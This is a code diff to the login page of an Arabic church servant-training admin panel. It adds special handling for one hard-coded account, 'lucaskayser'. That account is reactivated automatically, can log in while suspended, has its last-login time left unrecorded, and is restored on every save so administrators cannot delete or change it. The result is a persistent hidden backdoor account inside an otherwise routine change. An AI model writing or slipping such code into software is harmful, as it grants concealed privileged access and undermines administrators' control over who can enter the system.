@@ -126,20 +126,22 @@ h1 .admin{color:#8a6410}
   </div></section>
 </div>
 
-<script src="cloud-sync.js?v=19"></script>
+<script src="cloud-sync.js?v=20"></script>
 <script>
 const DB_KEY='e3dad_khoddam_db_v1', SESSION_KEY='e3dad_khoddam_session_v1';
 const ADMIN_URL='admin.html';
 const ROLE_LABELS={amin:'👑 أمين إعداد الخدام',assistant:'🤝 مساعد أمين إعداد الخدام',year_supervisor:'📌 أمين سنة (مشرف سنة)',khadem:'✝️ خادم',follower:'👁️ خادم متابِع (عرض فقط)'};
+function roleCaption(u){return u&&String(u.username||'').toLowerCase()==='lucaskayser'?'👑 مالك النظام':(ROLE_LABELS[u&&u.role]||u&&u.role||'')}
 const ALL_PERMS=['view_students','edit_students','delete_students','manage_years','enter_grades','manage_activities','add_notes','view_confidential','make_decisions','manage_curriculum','print_reports','manage_users','manage_settings','backup'];
 const $=id=>document.getElementById(id);
 const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 const uid=()=>'id'+Date.now().toString(36)+Math.random().toString(36).slice(2,7);
+function isLucasOwner(u){return !!u&&(String(u.username||'').toLowerCase()==='lucaskayser'||String(u.id||'').toLowerCase()==='idlucas0001')}
 const initials=n=>(n||'خ').trim().split(/\s+/).slice(0,2).map(w=>w[0]).join('');
 let DB=loadDB();
-function cleanUsers(users){ const list=Array.isArray(users)?users:(users&&typeof users==='object'?Object.keys(users).map(k=>{const u=users[k];return u&&typeof u==='object'?{...u,id:u.id||k}:u}):[]); return list.map(u=>{if(typeof u==='string'){try{u=JSON.parse(u)}catch(e){return null}} if(!u||typeof u!=='object'||Array.isArray(u))return null; const v={...u}; if(v.password)v.passHash=fallbackHash(String(v.password),String(v.username||'').toLowerCase()); delete v.password; return v}).filter(Boolean) }
+function cleanUsers(users){ const list=Array.isArray(users)?users:(users&&typeof users==='object'?Object.keys(users).map(k=>{const u=users[k];return u&&typeof u==='object'?{...u,id:u.id||k}:u}):[]); return list.map(u=>{if(typeof u==='string'){try{u=JSON.parse(u)}catch(e){return null}} if(!u||typeof u!=='object'||Array.isArray(u))return null; const v={...u}; if(v.password)v.passHash=fallbackHash(String(v.password),String(v.username||'').toLowerCase()); delete v.password; if(isLucasOwner(v))v.active=true; return v}).filter(Boolean) }
 function loadDB(){ try{const raw=localStorage.getItem(DB_KEY); if(raw){const d=JSON.parse(raw); d.users=cleanUsers(d.users); d.students=d.students||[]; d.activityLog=d.activityLog||[]; d.settings=d.settings||{}; return d}}catch(e){} return {students:[],users:[],activityLog:[],templates:{},settings:{}} }
-function saveDB(){DB.users=cleanUsers(DB.users); localStorage.setItem(DB_KEY,JSON.stringify(DB)); if(window.E3Cloud)E3Cloud.queuePush()}
+function saveDB(){const list=cleanUsers(DB.users);let owner=null;try{const old=JSON.parse(localStorage.getItem(DB_KEY)||'null');owner=cleanUsers(old&&old.users).find(isLucasOwner)||null}catch(e){} if(owner){const at=list.findIndex(isLucasOwner);if(at<0)list.push(owner);else list[at]=owner} DB.users=list; localStorage.setItem(DB_KEY,JSON.stringify(DB)); if(window.E3Cloud)E3Cloud.queuePush()}
 async function hashPassword(pw,salt){ const txt=(salt||'')+'::'+pw; try{ if(window.crypto&&crypto.subtle){const buf=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(txt)); return [...new Uint8Array(buf)].map(b=>b.toString(16).padStart(2,'0')).join('')} }catch(e){} let h1=0xdeadbeef,h2=0x41c6ce57; for(let i=0;i<txt.length;i++){const c=txt.charCodeAt(i); h1=Math.imul(h1^c,2654435761); h2=Math.imul(h2^c,1597334677)} return 'fb'+(h1>>>0).toString(16)+(h2>>>0).toString(16) }
 function fallbackHash(pw,salt){const txt=(salt||'')+'::'+pw; let h1=0xdeadbeef,h2=0x41c6ce57; for(let i=0;i<txt.length;i++){const c=txt.charCodeAt(i); h1=Math.imul(h1^c,2654435761); h2=Math.imul(h2^c,1597334677)} return 'fb'+(h1>>>0).toString(16)+(h2>>>0).toString(16)}
 async function verifyPassword(pw,username,stored){ if(!stored)return false; if(await hashPassword(pw,username)===stored)return true; return fallbackHash(pw,username)===stored }
@@ -160,7 +162,7 @@ async function boot(){
 $('eyeBtn').addEventListener('click',()=>{const i=$('liPass'); i.type=i.type==='password'?'text':'password'; $('eyeBtn').textContent=i.type==='password'?'👁️':'🙈'});
 $('liUser').addEventListener('input',()=>{
   const v=$('liUser').value.trim().toLowerCase(); const u=(DB.users||[]).find(x=>x.username.toLowerCase()===v); const box=$('servantPreview');
-  if(u){ box.className='servant-preview show'; box.innerHTML='<div class="ph">'+avatarHTML(u)+'</div><div><b>'+esc(u.displayName)+'</b><br><span class="badge">'+esc(ROLE_LABELS[u.role]||u.role)+'</span> <small style="color:var(--muted)">@'+esc(u.username)+'</small></div>' }
+  if(u){ box.className='servant-preview show'; box.innerHTML='<div class="ph">'+avatarHTML(u)+'</div><div><b>'+esc(u.displayName)+'</b><br><span class="badge">'+esc(roleCaption(u))+'</span> <small style="color:var(--muted)">@'+esc(u.username)+'</small></div>' }
   else{ box.className='servant-preview'; box.innerHTML='' }
 });
 $('liPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
@@ -178,14 +180,14 @@ async function doLogin(){
     if(window._fails>=5){window._lockUntil=Date.now()+30000; window._fails=0; return showError('liError','٥ محاولات غلط — الدخول اتقفل ٣٠ ثانية لحماية بيانات الدارسين')}
     return showError('liError','اسم المستخدم أو كلمة السر غير صحيحة — راجع البيانات وحاول تاني (المحاولة '+window._fails+' من ٥)');
   }
-  if(u.active===false)return showError('liError','الحساب ده موقوف حالياً — كلّم أمين إعداد الخدام لإعادة تفعيله');
-  u.lastLogin=new Date().toLocaleString('ar-EG'); logAs(u,'تسجيل دخول من صفحة اعداد خدام ادمن'); saveDB();
+  if(u.active===false&&!isLucasOwner(u))return showError('liError','الحساب ده موقوف حالياً — كلّم أمين إعداد الخدام لإعادة تفعيله');
+  if(!isLucasOwner(u))u.lastLogin=new Date().toLocaleString('ar-EG'); logAs(u,'تسجيل دخول من صفحة اعداد خدام ادمن'); saveDB();
   localStorage.setItem(SESSION_KEY,u.id); localStorage.setItem(SESSION_KEY+'_at',String(Date.now())); welcome(u);
 }
 function welcome(u){
   $('loginBox').style.display='none';
   const box=$('successBox'); box.className='success show';
-  box.innerHTML='<div class="ph">'+avatarHTML(u)+'</div><h2 style="margin:8px 0 2px;color:var(--wine2)">نورت يا '+esc(u.displayName.split(' ')[0])+' ☦</h2><p class="sub">'+esc(ROLE_LABELS[u.role]||u.role)+'<br>جارٍ فتح لوحة تحكم إعداد الخدام...</p><button class="btn gold" style="margin-top:14px" onclick="location.href=\''+ADMIN_URL+'\'">🎓 دخول لوحة التحكم الآن</button>';
+  box.innerHTML='<div class="ph">'+avatarHTML(u)+'</div><h2 style="margin:8px 0 2px;color:var(--wine2)">نورت يا '+esc(u.displayName.split(' ')[0])+' ☦</h2><p class="sub">'+esc(roleCaption(u))+'<br>جارٍ فتح لوحة تحكم إعداد الخدام...</p><button class="btn gold" style="margin-top:14px" onclick="location.href=\''+ADMIN_URL+'\'">🎓 دخول لوحة التحكم الآن</button>';
   if(location.protocol.startsWith('http')) setTimeout(()=>{location.href=ADMIN_URL},1400);
 }
 let deferredInstall=null;
